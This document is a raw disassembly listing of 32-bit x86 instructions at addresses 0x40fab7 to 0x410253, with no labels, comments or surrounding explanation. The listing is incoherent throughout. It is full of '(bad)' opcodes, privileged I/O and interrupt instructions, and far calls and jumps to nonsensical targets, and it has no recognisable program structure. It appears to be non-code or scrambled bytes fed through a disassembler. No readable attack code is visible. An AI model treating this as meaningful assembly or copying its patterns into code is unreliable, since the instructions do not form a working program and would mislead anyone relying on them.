  40fab7:	xchg   edx,eax
  40fab8:	push   0x16aeeef3
  40fabd:	inc    ebp
  40fabe:	or     eax,ecx
  40fac0:	rcr    BYTE PTR [esi],1
  40fac2:	out    0x2f,al
  40fac4:	idiv   BYTE PTR [eax+0x5f30c99c]
  40faca:	jnp    0x40fb2d
  40facc:	call   0x135424a
  40fad1:	jns    0x40fa65
  40fad3:	push   eax
  40fad4:	pop    ebx
  40fad5:	hlt    
  40fad6:	pop    edi
  40fad7:	jno    0x40fb0a
  40fad9:	or     eax,0x974b2c7f
  40fade:	pop    esi
  40fadf:	jno    0x40fb0f
  40fae1:	jle    0x40fb07
  40fae3:	repnz outs dx,DWORD PTR gs:[esi]
  40fae6:	shl    DWORD PTR [esi],0xe
  40fae9:	jae    0x40fb53
  40faeb:	jo     0x40fb2b
  40faed:	adc    BYTE PTR [ebx],al
  40faef:	push   cs
  40faf0:	(bad)  ds:0xa6cd2eeb
  40faf6:	push   ebp
  40faf7:	(bad)  
  40faf8:	lock sbb bh,al
  40fafb:	sbb    al,0xa0
  40fafd:	or     DWORD PTR [esi+0x5e27d5cd],ebp
  40fb03:	mov    bh,0x41
  40fb05:	ds add al,0x9c
  40fb08:	ins    BYTE PTR es:[edi],dx
  40fb09:	es das 
  40fb0b:	fild   QWORD PTR [eax-0x68f419a7]
  40fb11:	push   cs
  40fb12:	scas   al,BYTE PTR es:[edi]
  40fb13:	xlat   BYTE PTR ds:[ebx]
  40fb14:	xchg   ebp,eax
  40fb15:	mov    bh,0x8b
  40fb17:	stc    
  40fb18:	xchg   BYTE PTR [ebx-0x4d526773],bh
  40fb1e:	(bad)  
  40fb20:	clc    
  40fb21:	sbb    BYTE PTR [edx],0x1c
  40fb24:	mov    ebx,0x5db3e0b1
  40fb29:	jne    0x40fb18
  40fb2b:	adc    eax,0xc4b12713
  40fb30:	jle    0x40fb27
  40fb32:	stos   DWORD PTR es:[edi],eax
  40fb33:	jae    0x40fb06
  40fb35:	and    DWORD PTR [ebx+0x645a2eee],esp
  40fb3b:	mov    ah,0xd7
  40fb3d:	jne    0x40fb37
  40fb3f:	mov    al,ds:0xf0f2863d
  40fb44:	mov    bl,0x5b
  40fb46:	ficom  DWORD PTR [esi+0x2]
  40fb49:	and    ah,bh
  40fb4b:	outs   dx,DWORD PTR ds:[esi]
  40fb4c:	cmc    
  40fb4d:	push   ds
  40fb4e:	and    DWORD PTR [ebp-0x59],0xbd0a1029
  40fb55:	sbb    al,0x4d
  40fb57:	push   cs
  40fb58:	jno    0x40fbab
  40fb5a:	and    eax,0xbfa4592a
  40fb5f:	cs push ebx
  40fb61:	(bad)  
  40fb62:	out    0x5b,eax
  40fb64:	and    ch,BYTE PTR [esi+0x18f37f07]
  40fb6a:	push   0x3a
  40fb6c:	push   ss
  40fb6d:	jo     0x40fafc
  40fb6f:	dec    edx
  40fb70:	sub    al,0xeb
  40fb72:	or     DWORD PTR [ebx+0x9],esp
  40fb75:	(bad)  
  40fb76:	jnp    0x40fb6f
  40fb78:	sbb    DWORD PTR ds:0xa07e2f84,esp
  40fb7e:	adc    DWORD PTR [ecx-0x72785367],ecx
  40fb84:	sar    ebx,cl
  40fb86:	inc    ebp
  40fb87:	cmp    bh,cl
  40fb89:	fistp  QWORD PTR [ebx-0x7ca14653]
  40fb8f:	jns    0x40fb44
  40fb91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb92:	push   esp
  40fb93:	mov    edi,0xf29d91af
  40fb98:	(bad)  
  40fb99:	repnz pop es
  40fb9b:	add    ecx,DWORD PTR [eax+0x12]
  40fb9e:	lods   eax,DWORD PTR ds:[esi]
  40fb9f:	mov    cl,0x3
  40fba1:	inc    esi
  40fba2:	adc    ecx,esp
  40fba4:	and    edx,DWORD PTR [ecx-0x47]
  40fba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fba8:	fs xchg edx,eax
  40fbaa:	and    BYTE PTR [edi+0x13391f61],dl
  40fbb0:	mov    ecx,0x5d6cd0f2
  40fbb5:	push   0xffffffd9
  40fbb7:	aas    
  40fbb8:	rol    BYTE PTR [ecx+edx*4],cl
  40fbbb:	inc    esp
  40fbbc:	rcr    BYTE PTR [edx-0x25],cl
  40fbbf:	sti    
  40fbc0:	add    ebx,esp
  40fbc2:	test   BYTE PTR [ecx],cl
  40fbc4:	or     al,0x2d
  40fbc6:	pop    edx
  40fbc7:	nop
  40fbc8:	mov    edx,0x825ce88
  40fbcd:	sahf   
  40fbce:	add    dh,BYTE PTR [edx+0x7d3641ac]
  40fbd4:	push   ecx
  40fbd5:	sbb    ah,BYTE PTR [esp+eiz*8-0x411a0253]
  40fbdc:	mov    ecx,es
  40fbde:	mov    eax,ds:0x2e06eeac
  40fbe3:	mov    bl,0x74
  40fbe5:	or     dh,BYTE PTR [esi-0x28051345]
  40fbeb:	mov    BYTE PTR [ebx+eiz*1-0x7d8ed83d],bl
  40fbf2:	loope  0x40fc04
  40fbf4:	jno    0x40fbae
  40fbf6:	or     bh,BYTE PTR [edx+edi*2]
  40fbf9:	call   0xbbada7e0
  40fbfe:	jno    0x40fc7d
  40fc00:	mov    ah,BYTE PTR [esi-0x4d]
  40fc03:	hlt    
  40fc04:	lods   al,BYTE PTR ds:[esi]
  40fc05:	jae    0x40fc16
  40fc07:	sub    DWORD PTR [esi-0x6d],esp
  40fc0a:	fist   DWORD PTR [edi-0x72c1dd8]
  40fc10:	xor    ch,BYTE PTR [edx-0x24]
  40fc13:	sub    eax,0x7d7238ac
  40fc18:	push   es
  40fc19:	jmp    0x40fbfd
  40fc1b:	aad    0x63
  40fc1d:	adc    eax,0xcc4d382d
  40fc22:	xchg   ebp,eax
  40fc23:	test   eax,0x7d35cbe
  40fc28:	fs scas eax,DWORD PTR es:[edi]
  40fc2a:	push   ebp
  40fc2b:	dec    eax
  40fc2c:	inc    esp
  40fc2d:	inc    ebx
  40fc2e:	les    esp,FWORD PTR [eax-0x55d64ae]
  40fc34:	inc    ebx
  40fc35:	bound  esi,QWORD PTR [ebp+0x420b029a]
  40fc3b:	call   0x63a5:0xb142b153
  40fc42:	xor    ch,al
  40fc44:	nop
  40fc45:	cmp    bh,al
  40fc47:	mov    si,0xcd9c
  40fc4b:	jmp    0x40fc86
  40fc4d:	dec    edx
  40fc4e:	cmp    DWORD PTR [esi+0x7b],0x66e7839
  40fc55:	cdq    
  40fc56:	sbb    cl,BYTE PTR [ebx+0x61]
  40fc59:	pushf  
  40fc5a:	xor    BYTE PTR [ebx+0x41],ah
  40fc5d:	mov    ebp,0xbddeea26
  40fc62:	xor    ebp,DWORD PTR [ebx+0x54]
  40fc65:	xchg   BYTE PTR [ecx+edi*1+0x4c738325],ch
  40fc6c:	pop    es
  40fc6d:	ds adc ebx,esi
  40fc70:	mov    al,0x70
  40fc72:	shr    DWORD PTR [esp+edi*8+0x6b],1
  40fc76:	and    dl,ch
  40fc78:	add    ah,BYTE PTR [eax+0x10]
  40fc7b:	fwait
  40fc7c:	jne    0x40fc8b
  40fc7e:	cdq    
  40fc7f:	sar    DWORD PTR [eax],cl
  40fc81:	mov    ds:0xe70bbee4,eax
  40fc86:	sub    esp,edi
  40fc88:	pop    es
  40fc89:	imul   ecx,edx,0x10850b2a
  40fc8f:	mov    bl,0x19
  40fc91:	ins    DWORD PTR es:[edi],dx
  40fc92:	shl    BYTE PTR [eax+ebx*2+0x48],0x53
  40fc97:	out    0x9e,al
  40fc99:	xchg   esp,eax
  40fc9a:	imul   esi,DWORD PTR [ebp-0x9421acc],0xffffff97
  40fca1:	pop    ds
  40fca2:	leave  
  40fca3:	je     0x40fcfc
  40fca5:	stc    
  40fca6:	sub    eax,0xb30510a1
  40fcac:	dec    esp
  40fcad:	pop    esp
  40fcae:	mov    al,ds:0x5de7cb96
  40fcb3:	dec    ebx
  40fcb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcb5:	jbe    0x40fc5d
  40fcb7:	jbe    0x40fd1c
  40fcb9:	mov    eax,ds:0x464bf31a
  40fcbe:	xchg   esp,eax
  40fcbf:	je     0x40fc75
  40fcc1:	or     esi,ecx
  40fcc3:	fmul   st(7),st
  40fcc5:	(bad)  
  40fcc6:	ss inc esi
  40fcc8:	push   edi
  40fcc9:	retf   
  40fcca:	dec    eax
  40fccb:	test   ebp,eax
  40fccd:	jle    0x40fd3a
  40fccf:	int3   
  40fcd0:	jmp    0x66a62fe
  40fcd5:	pop    ecx
  40fcd6:	pop    ds
  40fcd7:	pop    esi
  40fcd8:	or     eax,0x707e7fee
  40fcdd:	cwde   
  40fcde:	inc    eax
  40fcdf:	add    esp,DWORD PTR [ecx-0x5baf147f]
  40fce5:	add    DWORD PTR [edx-0x55],0xffffffbf
  40fce9:	inc    ebx
  40fcea:	sub    ah,BYTE PTR [ebx-0x18cc1741]
  40fcf0:	mov    cs,WORD PTR [esi-0x37]
  40fcf3:	aad    0x97
  40fcf5:	mov    ebp,0xe93db94c
  40fcfa:	shr    dh,cl
  40fcfc:	retf   
  40fcfd:	adc    eax,0xb7af9146
  40fd02:	sti    
  40fd03:	repz in eax,dx
  40fd05:	jno    0x40fcc0
  40fd07:	mov    dl,0x52
  40fd09:	mov    esi,0x332968c7
  40fd0e:	adc    BYTE PTR [esi-0x20],dl
  40fd11:	iret   
  40fd12:	test   al,0xf5
  40fd14:	pop    esi
  40fd15:	or     al,0xc7
  40fd17:	xor    eax,0x84c39408
  40fd1c:	add    bh,0xb3
  40fd1f:	aam    0x92
  40fd21:	inc    esp
  40fd22:	inc    esi
  40fd23:	(bad)  [ecx-0xc]
  40fd26:	hlt    
  40fd27:	xchg   esp,eax
  40fd28:	call   0x9d6ca021
  40fd2d:	and    BYTE PTR [eax+0x1a3bc065],0xf2
  40fd34:	aad    0x41
  40fd36:	mov    al,ds:0x54eba99c
  40fd3b:	(bad)  
  40fd3c:	mul    DWORD PTR [ebp+0x3c]
  40fd3f:	jl     0x40fd14
  40fd41:	pusha  
  40fd42:	mov    edx,edx
  40fd44:	outs   dx,DWORD PTR ds:[esi]
  40fd45:	scas   al,BYTE PTR es:[edi]
  40fd46:	pop    ebx
  40fd47:	push   ebp
  40fd48:	imul   esi,eax,0xe
  40fd4b:	dec    esp
  40fd4c:	or     al,0x2f
  40fd4f:	sbb    al,0xa0
  40fd51:	jne    0x40fdc7
  40fd53:	into   
  40fd54:	push   es
  40fd55:	test   dh,0xcf
  40fd58:	mov    al,0x16
  40fd5a:	lahf   
  40fd5b:	push   esi
  40fd5c:	xchg   DWORD PTR [eax+0x4bf8bc5a],edx
  40fd62:	dec    edx
  40fd63:	les    esi,FWORD PTR [eax]
  40fd65:	test   eax,esi
  40fd67:	and    eax,0xb46300b5
  40fd6c:	ficom  WORD PTR [ecx+edx*4-0x4d]
  40fd70:	jl     0x40fdcd
  40fd72:	xchg   DWORD PTR [edx-0x21],ebx
  40fd75:	stos   DWORD PTR es:[edi],eax
  40fd76:	dec    ecx
  40fd77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd78:	add    edi,esp
  40fd7a:	into   
  40fd7b:	call   0x6e79b6cb
  40fd80:	xchg   esi,eax
  40fd81:	lods   eax,DWORD PTR ds:[esi]
  40fd82:	mov    DWORD PTR [eax-0x28],esi
  40fd85:	stos   DWORD PTR es:[edi],eax
  40fd86:	(bad)  
  40fd87:	mov    dh,0x3a
  40fd89:	nop
  40fd8a:	and    eax,0x1eeff8a9
  40fd8f:	push   edi
  40fd90:	sbb    al,0x28
  40fd92:	mov    ah,0x23
  40fd94:	inc    ecx
  40fd95:	jns    0x40fded
  40fd97:	adc    al,0xb1
  40fd99:	gs stos BYTE PTR es:[edi],al
  40fd9b:	mov    ds,WORD PTR [ebx]
  40fd9d:	pop    esi
  40fd9e:	and    al,0xa9
  40fda0:	lods   eax,DWORD PTR ds:[esi]
  40fda1:	dec    edx
  40fda2:	fbld   TBYTE PTR [esi]
  40fda4:	or     DWORD PTR [esp],0x3cfaa7a9
  40fdab:	xchg   esi,eax
  40fdac:	xchg   ah,bl
  40fdae:	(bad)
  40fdb1:	sbb    bl,BYTE PTR [ebx+0x35]
  40fdb4:	stc    
  40fdb5:	push   ds
  40fdb6:	or     al,BYTE PTR [edi-0x6c]
  40fdb9:	xchg   ecx,eax
  40fdba:	and    eax,0xae853c6e
  40fdbf:	mov    esi,0x75c4264f
  40fdc4:	inc    ebx
  40fdc5:	push   0x3d
  40fdc7:	outs   dx,BYTE PTR ds:[esi]
  40fdc8:	loop   0x40fe44
  40fdca:	push   cs
  40fdcb:	jns    0x40fd6a
  40fdcd:	fs xchg edi,eax
  40fdcf:	xchg   esi,eax
  40fdd0:	pop    edi
  40fdd1:	push   esp
  40fdd2:	xor    al,0xc2
  40fdd4:	(bad)  
  40fdd5:	push   ss
  40fdd6:	inc    edx
  40fdd7:	cld    
  40fdd8:	push   ds
  40fdd9:	dec    edx
  40fdda:	cli    
  40fddb:	fcomp  QWORD PTR [ecx]
  40fddd:	cli    
  40fdde:	mov    ebx,0x4ab56657
  40fde3:	in     eax,0x68
  40fde5:	push   ds
  40fde6:	sti    
  40fde7:	jg     0x40fdf0
  40fde9:	mov    dl,0xcc
  40fdeb:	outs   dx,BYTE PTR ds:[esi]
  40fdec:	push   ss
  40fded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdee:	mov    edx,0xfffa46fc
  40fdf3:	adc    esp,DWORD PTR [edx]
  40fdf5:	dec    edx
  40fdf6:	call   0x770c:0xb04d06df
  40fdfd:	or     ebx,DWORD PTR [ebx-0x738f65fe]
  40fe03:	sub    edi,DWORD PTR [ecx+0x5f]
  40fe06:	pop    es
  40fe07:	aam    0x2c
  40fe09:	shl    dl,0x16
  40fe0c:	pop    edx
  40fe0d:	test   al,0x73
  40fe0f:	sub    BYTE PTR [ebp-0x36225bc5],0x38
  40fe16:	push   ebx
  40fe17:	fst    DWORD PTR [esp+eax*2-0x495a51db]
  40fe1e:	fiadd  WORD PTR [ebx]
  40fe20:	hlt    
  40fe21:	pop    ebp
  40fe22:	mov    eax,0x404d08da
  40fe27:	adc    ebp,DWORD PTR [edi-0x6b]
  40fe2a:	mov    dl,0xfc
  40fe2c:	(bad)  
  40fe2d:	dec    ecx
  40fe2e:	mov    BYTE PTR [esi+0x38],cl
  40fe31:	mov    edx,0x30a6ea28
  40fe36:	rol    bh,1
  40fe38:	mov    WORD PTR [edx+0x52],fs
  40fe3b:	dec    ebx
  40fe3c:	lods   al,BYTE PTR ds:[esi]
  40fe3d:	cmc    
  40fe3e:	jl     0x40fe1a
  40fe40:	mov    eax,0x7bf6de5
  40fe45:	cli    
  40fe46:	xchg   BYTE PTR [eax],cl
  40fe48:	mov    ecx,esp
  40fe4a:	imul   esi,DWORD PTR [eax],0x1ee32b26
  40fe50:	lds    edx,FWORD PTR [edi*2-0x7700cbf5]
  40fe57:	cld    
  40fe58:	pop    ss
  40fe59:	dec    ecx
  40fe5a:	lock jns 0x40fde4
  40fe5d:	ins    DWORD PTR es:[edi],dx
  40fe5e:	cli    
  40fe5f:	inc    ebx
  40fe60:	sbb    al,0x3
  40fe62:	sub    BYTE PTR [ebx-0x2c531de6],dl
  40fe68:	std    
  40fe69:	sbb    BYTE PTR [edi-0x7a6b241a],dh
  40fe6f:	sub    esi,DWORD PTR [edx-0x2436777]
  40fe75:	xor    esp,0xc0f3e60d
  40fe7b:	pcmpgtb mm7,mm5
  40fe7e:	dec    ebx
  40fe7f:	cmp    al,0x64
  40fe81:	mov    esi,0x207ace9
  40fe86:	and    ecx,0x4bd4aac3
  40fe8c:	pusha  
  40fe8d:	sbb    DWORD PTR [ebx],eax
  40fe8f:	aam    0x44
  40fe91:	stc    
  40fe92:	out    0xe9,eax
  40fe94:	(bad)  
  40fe95:	stos   DWORD PTR es:[edi],eax
  40fe96:	pop    ds
  40fe97:	mov    cl,0x77
  40fe99:	mov    edi,0x81bf3b6
  40fe9e:	aad    0x25
  40fea0:	not    DWORD PTR [ebp+0x3db5fcf6]
  40fea6:	pop    esp
  40fea7:	mov    edi,0xe06054d3
  40feac:	mov    ecx,DWORD PTR [edx-0x7c]
  40feaf:	sbb    BYTE PTR [ecx-0x61f994db],cl
  40feb5:	sub    BYTE PTR [ecx+edi*1+0x41],cl
  40feb9:	mov    bl,0xe7
  40febb:	add    ecx,DWORD PTR [ecx+eiz*2-0x74]
  40febf:	and    BYTE PTR [edx],bh
  40fec1:	push   ds
  40fec2:	fs jb  0x40ff28
  40fec5:	push   ecx
  40fec6:	mov    al,ds:0x6ffe898d
  40fecb:	xor    DWORD PTR [ebx-0x66],edi
  40fece:	loopne 0x40fef2
  40fed0:	aam    0x30
  40fed2:	mov    ebp,0xad8f419d
  40fed7:	mov    al,ds:0x752961fc
  40fedc:	jmp    0x5b421f7f
  40fee1:	mul    BYTE PTR [ebp-0x4c]
  40fee4:	enter  0x9a14,0xc
  40fee8:	and    al,0x5d
  40feea:	(bad)  
  40feeb:	fs cmp bl,ch
  40feee:	test   eax,0xef29041f
  40fef3:	call   0x260321be
  40fef8:	(bad)  
  40fef9:	out    dx,eax
  40fefa:	in     al,0x3e
  40fefc:	cwde   
  40fefd:	repnz sbb BYTE PTR [eax-0x50586106],al
  40ff04:	jp     0x40fefe
  40ff06:	or     ecx,DWORD PTR [edx+0x7ef7bec6]
  40ff0c:	mov    ch,0x0
  40ff0e:	pop    ds
  40ff0f:	inc    ebp
  40ff10:	mov    esi,ds
  40ff12:	mov    ah,0xe4
  40ff14:	shl    DWORD PTR [ebx+0x29],1
  40ff17:	lahf   
  40ff18:	dec    edx
  40ff19:	xchg   esp,eax
  40ff1a:	inc    edi
  40ff1b:	pop    esp
  40ff1c:	out    dx,al
  40ff1d:	outs   dx,BYTE PTR ds:[esi]
  40ff1e:	scas   eax,DWORD PTR es:[edi]
  40ff1f:	pop    ds
  40ff20:	sub    eax,0xe770bb85
  40ff25:	sub    eax,0xf2bddccd
  40ff2a:	test   DWORD PTR [eax],0x47099ff4
  40ff30:	mov    ds:0xd97f12b,al
  40ff35:	pop    ds
  40ff36:	mov    eax,0xf470cf57
  40ff3b:	adc    edi,DWORD PTR [edi+esi*2]
  40ff3e:	or     eax,0xa9d429a3
  40ff43:	xchg   esp,eax
  40ff44:	enter  0x5c99,0xb1
  40ff48:	inc    BYTE PTR [ecx+0x738d00d2]
  40ff4e:	and    eax,ecx
  40ff50:	cmp    al,0xc1
  40ff52:	sub    al,0xbd
  40ff54:	ss pop ecx
  40ff56:	fidiv  WORD PTR [eax+0x41]
  40ff59:	mov    es,WORD PTR [ebx+0x7db48557]
  40ff5f:	mov    bh,0x80
  40ff61:	dec    eax
  40ff62:	push   eax
  40ff63:	xchg   edx,eax
  40ff64:	in     al,0x9c
  40ff66:	mov    al,ds:0xbec61121
  40ff6b:	sub    al,0xd
  40ff6d:	inc    edx
  40ff6e:	std    
  40ff6f:	dec    ecx
  40ff70:	and    BYTE PTR [esi],dh
  40ff72:	xlat   BYTE PTR ds:[ebx]
  40ff73:	rol    BYTE PTR [ecx+esi*2-0x64],cl
  40ff77:	pop    edi
  40ff78:	add    ebx,DWORD PTR [eax+0x78c85089]
  40ff7e:	push   es
  40ff7f:	imul   edi,esi,0xf0ebdd74
  40ff85:	rcl    BYTE PTR [edx-0x2a],cl
  40ff88:	pop    ecx
  40ff89:	sbb    ecx,DWORD PTR [ebx+0x1d09fe85]
  40ff8f:	push   ebp
  40ff90:	jecxz  0x40ff24
  40ff92:	aad    0x6a
  40ff94:	xchg   ebp,ecx
  40ff96:	mov    ebp,0x41bfed36
  40ff9b:	(bad)  
  40ff9c:	sar    dh,1
  40ff9e:	fcomp  QWORD PTR [eax+esi*8+0x3b1affd3]
  40ffa5:	(bad)  
  40ffa6:	push   edx
  40ffa7:	cld    
  40ffa8:	or     BYTE PTR [esp+edi*2+0x5200b8ae],0x9d
  40ffb0:	xchg   ecx,eax
  40ffb1:	jne    0x41002a
  40ffb3:	push   edx
  40ffb4:	(bad)  
  40ffb5:	idiv   cl
  40ffb7:	inc    ebp
  40ffb8:	jae    0x40ff68
  40ffba:	xor    ch,BYTE PTR [eax-0x4f]
  40ffbd:	fld    DWORD PTR [ecx]
  40ffbf:	loop   0x40ffde
  40ffc1:	pop    ss
  40ffc2:	jo     0x410019
  40ffc4:	push   ds
  40ffc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffc6:	push   ds
  40ffc7:	xor    ecx,DWORD PTR [ebx-0x3cd79569]
  40ffcd:	in     al,dx
  40ffce:	rol    ebp,cl
  40ffd0:	je     0x410034
  40ffd2:	int3   
  40ffd3:	push   esp
  40ffd4:	sahf   
  40ffd5:	lods   al,BYTE PTR ds:[esi]
  40ffd6:	pop    edx
  40ffd7:	cmp    ah,BYTE PTR [esi+0x46]
  40ffda:	sti    
  40ffdb:	stc    
  40ffdc:	rcl    DWORD PTR [edi-0x80a4696],1
  40ffe2:	mov    ah,0x94
  40ffe4:	iret   
  40ffe5:	or     DWORD PTR [eax+0x609f728],0xffffffb6
  40ffec:	mov    ah,0xb7
  40ffee:	xchg   DWORD PTR [edx],ebx
  40fff0:	sahf   
  40fff1:	inc    ebp
  40fff2:	dec    eax
  40fff3:	fadd   QWORD PTR ds:0x8eb0e459
  40fff9:	rcl    ebx,0x33
  40fffc:	cmp    DWORD PTR gs:[ebx-0x5d],ecx
  410000:	adc    dl,dl
  410002:	dec    ebp
  410003:	cdq    
  410004:	ss mov esp,0xdcb68d8
  41000a:	pop    ds
  41000b:	mov    ds:0xcfa9a6e2,eax
  410010:	and    DWORD PTR [eax],0xd4af216c
  410016:	mov    BYTE PTR [esi],dl
  410018:	ja     0x410019
  41001a:	scas   eax,DWORD PTR es:[edi]
  41001b:	xchg   esi,eax
  41001c:	add    al,BYTE PTR es:[ecx-0x5]
  410020:	ret    
  410021:	ja     0x40fff9
  410023:	mov    dh,0x4c
  410025:	stos   BYTE PTR es:[edi],al
  410026:	out    dx,eax
  410027:	inc    edx
  410028:	pop    ds
  410029:	jle    0x410056
  41002b:	sub    BYTE PTR ds:0x371b695c,bl
  410031:	add    bh,BYTE PTR [ebx-0x18558ce4]
  410037:	lds    esi,FWORD PTR [edi+0x3c117978]
  41003d:	jnp    0x40ffe6
  41003f:	inc    edi
  410040:	imul   edi,DWORD PTR [ecx],0xeedc4cc1
  410046:	pushf  
  410047:	push   edi
  410048:	cwde   
  410049:	xchg   ebx,eax
  41004a:	inc    DWORD PTR [edi+0x3789c535]
  410050:	mov    bh,0x6b
  410052:	mov    ebx,0xb3ff36ad
  410057:	or     esp,DWORD PTR [ecx]
  410059:	pop    ds
  41005a:	jmp    0xf0ee:0xe07026f2
  410061:	fwait
  410062:	xor    eax,DWORD PTR [edi+edx*8]
  410065:	xchg   BYTE PTR [edi-0x5da1c8e1],bl
  41006b:	mov    DWORD PTR [edx+0x50],esp
  41006e:	mov    edi,0x25e9fc07
  410073:	ret    0xf8ba
  410076:	in     al,0x9c
  410078:	adc    bl,BYTE PTR [esi+0x496ff7e1]
  41007e:	add    BYTE PTR ds:0xe637dfcc,0xf3
  410085:	mov    eax,0x2e128f2a
  41008a:	lds    ecx,FWORD PTR [ebp+ebp*1-0x3a]
  41008e:	mov    ah,0xa6
  410090:	lods   al,BYTE PTR ds:[esi]
  410091:	sbb    dh,al
  410093:	fldenv [esi-0x4daf6aa2]
  410099:	ja     0x41010e
  41009b:	or     ch,ch
  41009d:	scas   eax,DWORD PTR es:[edi]
  41009e:	xor    ch,BYTE PTR ds:0x6fcd67d0
  4100a4:	add    al,0x97
  4100a6:	inc    ebp
  4100a7:	fs cdq 
  4100a9:	ins    DWORD PTR es:[edi],dx
  4100aa:	xchg   ebp,eax
  4100ab:	dec    edx
  4100ac:	icebp  
  4100ad:	push   eax
  4100ae:	dec    eax
  4100af:	mov    ds:0xb1e8a649,al
  4100b4:	jp     0x4100f5
  4100b6:	test   eax,0x5cbc9a50
  4100bb:	dec    ebx
  4100bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100bd:	sub    al,0xff
  4100bf:	inc    esp
  4100c0:	imul   ebx,DWORD PTR [ecx-0x15],0xedf97bb7
  4100c7:	add    al,0x8
  4100c9:	in     al,dx
  4100ca:	cld    
  4100cb:	pop    edi
  4100cc:	and    DWORD PTR [ecx+eax*4-0x30],ebp
  4100d0:	sub    ebx,edx
  4100d2:	(bad)  
  4100d3:	mov    al,ds:0xf4488734
  4100d8:	jle    0x41006b
  4100da:	jae    0x4100ef
  4100dc:	cli    
  4100dd:	mov    ebx,esi
  4100df:	mov    eax,ebx
  4100e1:	repnz mov esi,0x77f9e412
  4100e7:	(bad)  
  4100e8:	rol    ecx,1
  4100ea:	jl     0x410095
  4100ec:	sti    
  4100ed:	in     eax,dx
  4100ee:	sbb    bl,bl
  4100f0:	cmp    al,0xe2
  4100f2:	xor    eax,0x74d64a68
  4100f7:	sub    ch,BYTE PTR [ebx-0x79b0f63a]
  4100fd:	imul   ebx,DWORD PTR [edi],0xd2c75972
  410103:	(bad)  
  410104:	in     eax,0x80
  410106:	dec    ebx
  410107:	hlt    
  410108:	fild   QWORD PTR [edx-0x79]
  41010b:	pusha  
  41010c:	inc    ebx
  41010d:	iret   
  41010e:	fs jne 0x410108
  410111:	js     0x41011e
  410113:	mov    esi,0x36d36e7
  410118:	mov    bh,0xd7
  41011a:	mov    ds:0xbe28da57,al
  41011f:	push   ds
  410120:	(bad)  
  410121:	ja     0x410130
  410123:	popf   
  410124:	repz ficomp DWORD PTR [edi-0x34]
  410128:	xor    BYTE PTR [ebp-0x53],al
  41012b:	xor    al,0x73
  41012d:	ja     0x41010e
  41012f:	pusha  
  410130:	push   edi
  410131:	inc    edx
  410132:	mov    ecx,0x2b78356e
  410137:	mov    esi,0xca249906
  41013c:	mov    bl,0xfc
  41013e:	mov    eax,0x6e4e9cc8
  410143:	cld    
  410144:	xchg   ebx,eax
  410145:	add    dl,BYTE PTR [ebx+0x7dd657c4]
  41014b:	xchg   ebx,eax
  41014c:	add    bl,BYTE PTR [ecx-0x5fcf7742]
  410152:	je     0x4100ee
  410154:	mov    ch,BYTE PTR [ecx-0x663803ee]
  41015a:	ficomp DWORD PTR [edx-0x24930f36]
  410160:	test   bl,ah
  410162:	and    BYTE PTR [edi],al
  410164:	lds    esp,FWORD PTR [edx+0x659d85e9]
  41016a:	and    al,0xd8
  41016c:	push   ds
  41016d:	(bad)  
  41016e:	mov    BYTE PTR [eax],bl
  410170:	adc    edi,DWORD PTR [ebx]
  410172:	pop    ds
  410173:	and    edx,0x9
  410176:	and    al,0xb9
  410178:	aaa    
  410179:	sbb    eax,0xce2d263c
  41017e:	in     al,dx
  41017f:	mov    ecx,0xcf9a92bc
  410184:	adc    eax,0xaada8133
  410189:	dec    ebx
  41018a:	imul   esi,DWORD PTR [ebx+0x70cc73f2],0xffffff81
  410191:	data16 shr BYTE PTR [edi],1
  410194:	xchg   DWORD PTR ds:0xaec1252,ecx
  41019a:	pop    esp
  41019b:	dec    ecx
  41019c:	bswap  eax
  41019e:	inc    esi
  41019f:	jno    0x410197
  4101a1:	lods   al,BYTE PTR ds:[esi]
  4101a2:	xchg   ebp,eax
  4101a3:	out    0x78,al
  4101a5:	sbb    dh,ch
  4101a7:	inc    esp
  4101a8:	dec    ebx
  4101a9:	or     dl,al
  4101ab:	xor    eax,0x7f740360
  4101b0:	loope  0x4101f9
  4101b2:	fcomp  st(2)
  4101b5:	dec    esi
  4101b6:	ret    0x49b3
  4101b9:	xor    ch,cl
  4101bb:	lock bound eax,QWORD PTR [ebp-0x7e]
  4101bf:	test   eax,0xf412e160
  4101c4:	in     al,0x4a
  4101c6:	popa   
  4101c7:	shl    BYTE PTR [eax-0x47],1
  4101ca:	test   eax,0xaea6b6ab
  4101d0:	js     0x4101a7
  4101d2:	out    dx,al
  4101d3:	mov    BYTE PTR [ecx+0x42],0x28
  4101d7:	dec    edx
  4101d8:	imul   esi,DWORD PTR [esi],0x54
  4101db:	in     eax,dx
  4101dc:	adc    eax,0xf04b3e0c
  4101e1:	lea    ebx,[edi]
  4101e3:	jmp    0x410183
  4101e5:	pop    ss
  4101e6:	push   ebp
  4101e7:	xchg   edx,eax
  4101e8:	and    eax,0x83ab61b7
  4101ed:	add    edi,DWORD PTR [ecx]
  4101ef:	pop    esi
  4101f0:	test   al,0xe2
  4101f2:	jno    0x410215
  4101f4:	xchg   DWORD PTR [ecx+0x5c21326],edi
  4101fa:	push   0x29faee91
  4101ff:	lock retf 
  410201:	in     al,0x9f
  410203:	cdq    
  410204:	xor    al,0xe4
  410206:	shr    BYTE PTR ds:0x543179f0,0xc
  41020d:	pop    ebp
  41020e:	bound  esi,QWORD PTR [esi-0x4fb90436]
  410214:	fstp   TBYTE PTR [esi]
  410216:	aaa    
  410217:	xor    DWORD PTR [edx-0x10],0xd1991265
  41021e:	pop    ds
  41021f:	pop    ecx
  410220:	push   ss
  410221:	fnstsw WORD PTR [ebx+0x52249ef1]
  410227:	pop    edi
  410228:	imul   eax,DWORD PTR [ecx+0x7d],0x72f64625
  41022f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410230:	fidiv  WORD PTR [edi+0x59a8e8ba]
  410236:	jnp    0x41022f
  410238:	lods   eax,DWORD PTR ds:[esi]
  410239:	hlt    
  41023a:	shl    DWORD PTR [eax-0x66],0xd2
  41023e:	ret    0xaac1
  410241:	leavew 
  410243:	ja     0x4102a5
  410245:	inc    esp
  410246:	lds    eax,FWORD PTR gs:[esi+0x40ae5cbf]
  41024d:	pop    ss
  41024e:	jecxz  0x4101d6
  410250:	xchg   esp,eax
  410251:	loop   0x410259
  410253:	sbb    esp,esp
